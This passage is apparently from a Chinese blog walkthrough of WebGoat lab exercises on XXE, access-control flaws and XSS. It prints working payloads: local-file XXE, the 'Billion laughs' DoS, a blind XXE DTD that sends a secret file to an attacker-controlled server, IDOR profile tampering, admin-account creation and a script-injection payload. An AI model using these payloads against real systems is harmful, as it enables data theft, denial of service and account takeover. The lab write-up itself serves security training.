<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"> XXE prevention sheet</a></p>
<h3 id="7-4">7</h3>
<p>在现代REST框架中，服务器可能能够接受您作为开发人员没有想到的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</p>
<p>同样是相同的练习，但尝试执行与第一次赋值相同的 XML 注入。</p>
<p>这里我们同样是发送评论抓包</p>
<p>发现<code>Content-Type:application/json</code>，即json模式的</p>
<p>但是根据提示没有只接收json文件，这里直接换成<code>application/xml</code>就行了</p>
<p>把下面的数据部分换成</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///C:/&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="8-3">8.</h3>
<p>对第7题的解释</p>
<h3 id="9-3">9.</h3>
<p>这个挺有意思的，利用XXE进行DOS攻击</p>
<p>案例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">lolz</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当 XML 解析器加载此文档时，它会看到它包含一个根元素“lolz”，其中包含文本“&amp;lol9;”。但是，“&amp;lol9;”是一个已定义的实体，它扩展为包含十个“&amp;lol8;”字符串的字符串。每个“&amp;lol8;”字符串都是一个定义的实体，可扩展为十个“&amp;lol7;”字符串，依此类推。在处理完所有实体扩展后，这个小的 （&lt; 1 KB） XML 块实际上将占用近 3 GB 的内存。</p>
<p>这被称为&quot;Billion laughs&quot;</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Billion_laughs">维基百科（需要梯子）</a></p>
<h3 id="10-4">10.</h3>
<p>展示了如何通过 Blind XXE 攻击 ping 服务器</p>
<p>11就是实操</p>
<h3 id="11-3">11.</h3>
<p>根据题意，盗取 目标服务器上的</p>
<p><code>C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt</code></p>
<p>提示我们可以尝试使用 WebWolf 的landing页面上传此文件：<a target="_blank" rel="noopener" href="http://localhost:9090/landing">http://localhost:9090/landing</a></p>
<p>WebGoat是当前论坛服务器，里面有我们的目标文件secret.txt<br>
WebWolf是入侵者的服务器，托管了一个attack.dtd攻击文件</p>
<p>流程：<br>
入侵者进入被害者的论坛，发送信息同时用Burp拦截请求，修改自己的评论内容使其远程链接到入侵者的WebWolf网站的attack.dtd文件，attack.dtd文件读取了被害者服务器中的文件信息，被害者服务器将该私密信息返回到论坛中并显示在网页上。</p>
<p>创建attack.dtd文件</p>
<blockquote>
<p>注意需要获取的文件换成你的</p>
</blockquote>
<p>file用于获取目标服务器上的文件</p>
<p>print用于发送到webwolf，这个请求会被拦截</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">&lt;!-- &amp;#37; 是一个字符实体引用，代表百分号（%）。确保了百分号不会被误解为XML标记的一部分。 --&gt;</span><br></pre></td></tr></table></figure>
<p>然后随便发送评论burp抓包,在结尾加上payload ，注意下面的url中的username换成你的，attack.dtd文件名也不能出错</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/username/attack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%print;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>cute<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>去webwolf看收到的数据(url后面的text)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;timestamp&quot; : &quot;2024-01-05T09:03:11.930091100Z&quot;,</span><br><span class="line">  &quot;principal&quot; : null,</span><br><span class="line">  &quot;session&quot; : null,</span><br><span class="line">  &quot;request&quot; : &#123;</span><br><span class="line">    &quot;method&quot; : &quot;GET&quot;,</span><br><span class="line">    &quot;uri&quot; : &quot;http://localhost:9090/landing?text=WebGoat%208.0%20rocks...%20(AgzOeuyeHm)&quot;,</span><br><span class="line">    &quot;headers&quot; : &#123;</span><br><span class="line">      &quot;Accept&quot; : [ &quot;text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2&quot; ],</span><br><span class="line">      &quot;Connection&quot; : [ &quot;keep-alive&quot; ],</span><br><span class="line">      &quot;User-Agent&quot; : [ &quot;Java/17.0.9&quot; ],</span><br><span class="line">      &quot;Host&quot; : [ &quot;localhost:9090&quot; ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;remoteAddress&quot; : null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;response&quot; : &#123;</span><br><span class="line">    &quot;status&quot; : 200,</span><br><span class="line">    &quot;headers&quot; : &#123; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;timeTaken&quot; : 11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后解密出来时</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebGoat 8.0 rocks... (AgzOeuyeHm)</span><br></pre></td></tr></table></figure>
<p>把这个发送到评论就行了</p>
<blockquote>
<p>简述一下过程：发送修改的数据—&gt;%dtd;访问攻击者服务器上的dtd文件—&gt;调用print声明send，调用send，send会再调用file，file用于获取目标服务器上的文件，send发送给攻击者服务器，攻击者服务器获取数据后解析</p>
</blockquote>
<h4 id="疑问：">疑问：</h4>
<p>1.这里为什么需要嵌套</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>答：我试过后看了返回的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[5,7]\\nMessage: Server returned HTTP response code: 400 for URL: http:\\/\\/localhost:9090\\/landing?text=%file;]&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">400 Bad Request 是由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。</span></span><br></pre></td></tr></table></figure>
<p>嵌套应该是为了防止实体用于表示一些无法直接表示的字符或结构（个人猜测）</p>
<p>2.为什么print后还需要send，print不是会调用send吗</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">dtd;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="built_in">print</span>;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">send;</span></span><br></pre></td></tr></table></figure>
<p>答：没有调用，仅仅时声明了实体，而send会直接调用file</p>
<h3 id="12-13">12-13</h3>
<p>讲了xxe和缓解措施和用过静态代码分析查找xxe问题</p>
<h2 id="7-Broken-Access-Control（访问控制中断）">7.Broken Access Control（访问控制中断）</h2>
<h3 id="1-Insecure-Direct-Object-References（不安全的直接引用对象）">1.Insecure Direct Object References（不安全的直接引用对象）</h3>
<h4 id="1-4">1.</h4>
<p>直接对象引用<br>
直接对象引用是指应用程序使用客户端提供的输入来访问数据和对象。</p>
<p>例子<br>
使用 GET 方法的直接对象引用示例可能如下所示</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://some.company.tld/dor?id=12345</span><br><span class="line"></span><br><span class="line">https://some.company.tld/images?img=12345</span><br><span class="line"></span><br><span class="line">https://some.company.tld/dor/12345</span><br></pre></td></tr></table></figure>
<p>其他方法<br>
POST、PUT、DELETE 或其他方法也可能容易受到影响，主要仅在方法和潜在有效载荷上有所不同。</p>
<p>不安全的直接对象引用<br>
当引用未得到正确处理时，这些被认为是不安全的，并允许授权绕过或披露可用于 执行用户不应能够执行或访问的操作或访问数据。 假设作为用户，您去查看您的个人资料，URL 如下所示：</p>
<p><code>https://some.company.tld/app/user/23398</code></p>
<p>…您可以在那里查看您的个人资料。如果导航到以下位置，会发生什么情况：</p>
<p><code>https://some.company.tld/app/user/23399</code>…或在末尾使用另一个数字。如果您可以操作数字（用户 ID）并查看他人的配置文件，则对象引用是不安全的。 当然，这可以检查或扩展到 GET 方法之外，以查看数据，也可以操作数据。</p>
<p>更多好读物<br>
在我们继续练习之前，这里有一些关于不安全的直接对象引用的好读物：</p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_%EF%BC%88OTG-AUTHZ-004%EF%BC%89">https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_（OTG-AUTHZ-004）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control</a></p>
<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References">https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References</a></p>
<p><a target="_blank" rel="noopener" href="http://cwe.mitre.org/data/definitions/639.html">http://cwe.mitre.org/data/definitions/639.html</a></p>
<h4 id="2-8">2.</h4>
<p>先进行身份验证，后滥用授权<br>
许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份验证开始。然后，我们将寻找绕过或滥用授权的方法。</p>
<p>在这种情况下，帐户的 ID 和密码是“tom”和“cat”（这是一个不安全的应用程序，对吧？</p>
<p>身份验证后，进入下一个屏幕。</p>
<p>这题就是合法的身份验证，用tom和cat登录就行</p>
<h4 id="3-6">3.</h4>
<p>根据题意，查看请求中的非显示内容的属性</p>
<blockquote>
<p>A consistent principle from the offensive side of AppSec is to view differences from the raw response to what is visible</p>
<p>“AppSec” 是 “Application Security” 的缩写，指的是应用程序安全。</p>
<p>在应用程序安全中，攻击者通常会利用应用程序的漏洞来获取未授权的访问或执行恶意操作。为了实现这一目标，攻击者需要了解应用程序的内部工作原理和潜在的弱点。</p>
<p>从攻击面的角度来看，一个重要的原则是密切关注应用程序的原始响应与用户可见内容之间的差异。这涉及到对应用程序的深入分析，包括请求和响应的结构、数据传输方式以及应用程序的逻辑流程。</p>
</blockquote>
<p>就是你点击profile只有三个数据，但是响应的不止三个，用burp抓包就行，看返回的数据</p>
<p>可以知道多了<code>role,userId</code>(记得用都好隔开)</p>
<h4 id="4-8">4.</h4>
<p>题目要求我们以另一种方式查看您自己的个人资料</p>
<p>这一题用的是RESTful 模式</p>
<blockquote>
<p>RESTful是一种用于设计、构建和交付Web服务的架构风格。它基于HTTP协议，并使用不同的HTTP方法（如GET、POST、PUT、DELETE等）来执行不同的操作。</p>
<p>RESTful Web服务具有以下特点：</p>
<ol>
<li>客户端-服务器架构：客户端和服务器之间通过HTTP协议进行通信。客户端负责发送请求和接收响应，而服务器负责处理请求和返回响应。</li>
<li>资源标识：RESTful Web服务使用统一资源标识符（URI）来标识资源。例如，对于一个用户，可以将其标识为<code>/users/123</code>。</li>
<li>资源状态：每个资源都有一个与之关联的状态，该状态可以通过HTTP请求来修改。HTTP方法（如GET、POST、PUT、DELETE等）定义了如何通过URI标识的资源来修改状态。</li>
<li>无状态通信：RESTful Web服务遵循无状态通信原则，这意味着服务器不会为每个请求存储任何状态信息。这有助于提高服务的可伸缩性和可靠性。</li>
<li>缓存：RESTful Web服务支持缓存，以便提高性能和减少网络延迟。客户端和中间件可以使用HTTP缓存头来缓存响应，并在后续请求中重用它们。</li>
<li>统一接口：RESTful Web服务使用统一的接口来访问资源。这意味着客户端可以使用相同的HTTP方法（如GET、POST、PUT、DELETE等）来访问不同的资源。</li>
</ol>
<p>总之，RESTful Web服务提供了一种简单、一致和可扩展的方式来构建Web应用程序和服务之间的通信。它已经成为现代Web开发中的主流技术之一。</p>
</blockquote>
<p>看下提示：看看前面的配置文件请求，这是类似的</p>
<p>上一题看到了<code>get /WebGoat/IDOR/profile</code></p>
<p>返回的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;role&quot; : 3,</span><br><span class="line">  &quot;color&quot; : &quot;yellow&quot;,</span><br><span class="line">  &quot;size&quot; : &quot;small&quot;,</span><br><span class="line">  &quot;name&quot; : &quot;Tom Cat&quot;,</span><br><span class="line">  &quot;userId&quot; : &quot;2342384&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明请求路径大概是这样的</p>
<p>再看下提示说：将您的 ID 附加到上一个请求（即 …/profile/{yourId}）</p>
<p>我们填入<code>/WebGoat/IDOR/profile/2342384</code>就能访问自己的数据了</p>
<h4 id="5-10">5.</h4>
<blockquote>
<p>这题我需要吐槽一下自己自找聪明用两个浏览器，一会用edge答题，一会用火狐，导致在做第五题的时候不管我怎么修改请求包返回的都是错误500😭，花了我一下午找问题，最后没办法直接重开，只用火狐才做出来的</p>
</blockquote>
<p>题目主要的意思是第一个按钮是用来展现信息的，但是发送的请求包是%7BuserId%7D，即{userId}</p>
<p>说明提示我们用id去找，这里我们可以用2342384看一下tom的信息</p>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">again. You need to use the same method\\/URL you used to access your own profile via direct object reference</span><br></pre></td></tr></table></figure>
<p>看提示是要我们一个个推断userId，这里可以用burp爆破，也可以直接一个一个加</p>
<p>反之最后就是2342388</p>
<p>返回的json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;lessonCompleted&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;feedback&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Well done, you found someone else&#x27;s profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;output&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;assignment&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;IDORViewOtherProfile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attemptWasMade&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里WebGoat8.2.2出了BUG，查找到Buffalo后这题直接完成了。</p>
</blockquote>
<p>然后需要我们修改color为red，和修改role变小点</p>
<p>点击第二个按钮是用来修改信息的，点击后抓包</p>
<p>由题所知，这个请求遵循RESTful规则。</p>
<blockquote>
<p>RESTful：GET查询、POST新增、PUT修改、DELETE删除</p>
</blockquote>
<p>（1）请求方法从GET改为PUT</p>
<p>（2）Content-type改成application/json(因为需要传输修改的数据，修改的数据类型是json)</p>
<p>（3）请求内容中构造json格式的Buffalo Bill的profile，根据题目要求，role要设置为比3小的数，color要设置为red。</p>
<blockquote>
<p>{<br>
“role”:“1”,<br>
“color”:“red”,<br>
“size”:“large”,<br>
“name”:“Buffalo Bill”,<br>
“userId”:“2342388”<br>
}</p>
</blockquote>
<p>发送就行了</p>
<h4 id="6-7">6.</h4>
<p>讲了如何安全对象引用</p>
<h3 id="2-Missing-Function-Level-Access-Control（缺少功能级访问控制）">2.Missing Function Level Access Control（缺少功能级访问控制）</h3>
<h4 id="2-9">2.</h4>
<p>人们可以依靠 HTML、CSS 或 javascript 来隐藏用户通常不会访问的链接。 过去曾有过网络路由器试图在 UI 中使用 javascript 保护（隐藏）管理功能的情况：<a target="_blank" rel="noopener" href="https://www.wired.com/2009/10/routers-still-vulnerable%E3%80%82">https://www.wired.com/2009/10/routers-still-vulnerable。</a></p>
<p>查找隐藏物品<br>
通常有一些提示可以查找 UI 未公开的功能…</p>
<ul>
<li>
<p>HTML 或 javascript 注释</p>
</li>
<li>
<p>注释掉的元素</p>
</li>
<li>
<p>通过 CSS 控件/类隐藏的项目</p>
</li>
</ul>
<p>您的使命<br>
在下面的菜单中找到攻击者/恶意用户感兴趣的两个不可见菜单项，并提交这些菜单项的标签（菜单中目前没有链接）。</p>
<p>就是f12慢慢找呗。。。</p>
<p>找到了两个不可用的链接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/users&quot;&gt;Users&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;/config&quot;&gt;Config&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>把Users和Config填入就行了</p>
<h4 id="3-7">3.</h4>
<p>这题是要是收集用户信息</p>
<p>利用上一题得到的user和config</p>
<p>上一页中找到了链接/users，但是直接点击的话，是404 not found</p>
<p>前面得加上/WebGoat/即</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/users</span><br></pre></td></tr></table></figure>
<p>但是会返回500错误</p>
<p>下面有两个做法（当然是提示里面说的。。。）</p>
<h5 id="1-简单做法">1.简单做法</h5>
<p>抓包后加上</p>
<p>增加请求头<code>Content-Type: application/json</code>的操作之后顺利拿到了hash。。</p>
<p><s>但是这太难猜了把。。。</s></p>
<h5 id="2-进阶做法">2.进阶做法</h5>
<p>show hints还能看到一种复杂思路，照着这个思路走了一遍</p>
<p>首先创建一个admin权限的用户，需要做3处修改：</p>
<p>（1）增加请求头Content-Type: application/json</p>
<p>（2）请求方法改为POST</p>
<p>（3）增加json格式的数据：{“username”:“newUser2”,“password”:“newUser12”,“role”:“WEBGOAT_ADMIN”}</p>
<p>然后返回登录页面，用这个账号就可以登陆了，然后在这个账号下重复简单做法（其实就是cooike不一样了）</p>
<p>就能看到hash值了</p>
<p>这个对这题来说是绕了个圈子，因为最后都得绕回简单做法，因为后来试了一下，用自己本来的账号也可以看到所有用户的信息。。~<s>但或许这种思路在某些现实情况下有用吧</s></p>
<h2 id="8-Cross-Site-Scripting-XSS">8.Cross-Site Scripting(XSS)</h2>
<h3 id="1-5">1</h3>
<p>介绍XSS，即脚本，当前端或后端没有对用户输入进行过滤时，js脚本会在浏览器正常执行，常见的危害：<br>
窃取会话Cookie<br>
创建虚假请求<br>
在页面上创建虚假字段以收集凭据<br>
将您的页面重定向到“不友好”站点<br>
创建伪装成有效用户的请求<br>
窃取机密信息<br>
在最终用户系统上执行恶意代码（活动脚本）<br>
插入恶意和不适当的内容</p>
<h3 id="2-10">2</h3>
<p>根据题意，查看WebGoat内各个网页对应的Cookie是否都一样。<br>
（1）F12打开控制台<br>
输入JS命令，回车</p>
<p>（2）测试查看其他网页<br>
发现每个选项卡上的Cookie都相同</p>
<p>（3）填写yes</p>
<h3 id="3-8">3.</h3>
<p>xss最常见的位置</p>
<ul>
<li>
<p>将搜索字符串回显给用户的搜索字段</p>
</li>
<li>
<p>回显用户数据的输入字段</p>
</li>
<li>
<p>返回用户提供的文本的错误消息</p>
</li>
<li>
<p>包含用户提供的数据的隐藏字段</p>
</li>
<li>
<p>显示用户提供的数据的任何页面</p>
<ul>
<li>留言板</li>
<li>自由格式注释</li>
</ul>
</li>
<li>
<p>HTTP 标头</p>
</li>
</ul>
<h3 id="4-9">4.</h3>
<p>我们为什么要注意xss</p>
<p>XSS 攻击可能导致</p>
<pre><code>窃取会话 Cookie

创建虚假请求

在页面上创建 false 字段以收集凭据

将您的网页重定向到“不友好”的网站

创建伪装成有效用户的请求

窃取机密信息

在最终用户系统上执行恶意代码（活动脚本）

插入恶意和不当内容
	&lt;img src=&quot;http://malicious.site.com/image.jpg/&gt;
	&quot;&gt;GoodYear recommends buying BridgeStone tires...
</code></pre>
<p>XSS 攻击增加了网络钓鱼攻击的有效性</p>
<pre><code>URL 中使用了有效的域
</code></pre>
<h3 id="5-11">5.</h3>
<p>xss类型</p>
<p>反射型</p>
<pre><code>来自用户请求的恶意内容在 Web 浏览器中显示给用户

恶意内容在服务器响应后写入页面

需要社会工程学

使用从浏览器中的用户继承的浏览器权限运行
</code></pre>
<p>基于 DOM（也反映在技术上）</p>
<pre><code>客户端脚本使用来自用户请求的恶意内容将 HTML 写入其自己的页面

与reflected XSS相似

使用从浏览器中的用户继承的浏览器权限运行
</code></pre>
<p>存储或持久化</p>
<pre><code>恶意内容存储在服务器上（在数据库、文件系统或其他对象中），然后通过 Web 浏览器显示给用户

不需要社会工程
</code></pre>
<h3 id="7-5">7.</h3>
<p>找注入点</p>
<p>一个一个试就行了</p>
<p>分别在两个空输入<code>alert(1)</code>,看返回的结果，</p>
<p>结果显示第一空存在xss漏洞，即不会过滤非法的输入</p>
<p>这里我们在第二空输入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>就行了，即调用js的弹出窗口的功能</p>
<h3 id="9-4">9.</h3>
<p>反射型和基于 DOM 的 XSS</p>
<p>基于 DOM 的 XSS 是反射型 XSS 的另一种形式。两者都是通过发送一个链接来触发的，该链接的输入将反映到浏览器。 DOM 和“传统”反射型 XSS 之间的区别在于，使用 DOM 时，有效负载永远不会进入服务器。 它只会由客户端处理。</p>
<pre><code>攻击者向受害者发送恶意 URL

受害者点击链接

该链接可能会加载恶意网页或他们使用（已登录？）的网页，该网页具有易受攻击的路由/处理程序

如果它是一个恶意网页，它可能会使用自己的 JavaScript 来攻击另一个具有易受攻击的路由/处理程序的页面/URL

易受攻击的页面呈现有效负载，并在该页面/站点的用户上下文中执行攻击

攻击者的恶意脚本可能以本地账号的权限运行命令
</code></pre>
<p>受害者没有意识到发生了攻击 … 恶意攻击者不使用 <script>alert（‘xss’）&lt;/ script&gt;</p>
<h3 id="10-5">10.</h3>
<p>根据题意，我们要找到留在应用程序中的test代码的route，搜索js脚本。</p>
<p>这做题之前我们需要知道js里面的Backbone.Router</p>
